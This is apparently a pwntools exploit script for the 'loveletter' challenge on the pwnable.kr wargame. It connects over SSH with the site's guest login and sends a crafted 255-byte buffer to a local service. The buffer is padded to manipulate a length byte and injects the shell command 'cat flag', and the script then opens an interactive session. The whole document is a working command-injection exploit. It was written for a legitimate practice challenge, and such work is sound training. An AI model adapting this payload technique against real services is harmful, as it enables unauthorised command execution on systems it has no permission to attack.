from pwn import *

###Exploit
s = ssh(host='pwnable.kr',port=2222,
        user='loveletter',
        password='guest')
r = s.remote('127.0.0.1',9034)

r.send((b'val cat flag '.ljust(0xfd,b'a')+b';\x01').ljust(0xff,b'\x00'))
r.interactive()
